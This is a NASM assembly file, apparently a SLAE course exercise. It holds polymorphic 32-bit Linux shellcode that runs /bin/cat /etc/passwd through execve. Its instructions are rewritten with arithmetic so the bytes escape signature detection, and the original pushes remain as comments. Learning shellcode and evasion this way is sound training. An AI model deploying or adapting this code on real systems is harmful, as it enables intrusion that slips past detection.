; Filename: passwd-polymorphic.nasm
; Author: SLAE-14209

global _start           
section .text
_start:
     
    ;xor eax,eax
    sub eax, eax
    
    cdq
    push edx
    ;push 0x7461632f         ; "tac/"
    add ebx, 0x6350521e
    add ebx, 0x11111111
    push ebx
    xor ebx, ebx
    
    ;push 0x6e69622f         ; "nib/"
    add ebx, 0x7F7A7340
    sub ebx, 0x11111111
    push ebx
    xor ebx, ebx
    
    ;mov ebx,esp
    push esp
    pop ebx
 
    push edx
    ;push 0x64777373          ; "dwss"
    mov ecx, 0x64777371
    inc ecx
    inc ecx
    push ecx
    
    ;push 0x61702f2f          ; "ap//"    
    add eax,0x1d2d3d4d
    add eax,0x4442F1E2
    push eax
    xor eax,eax
    
    push 0x6374652f          ; "cte/"
    mov ecx,esp
   
    ;mov al,0xb
    mov al, 11
    
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80   
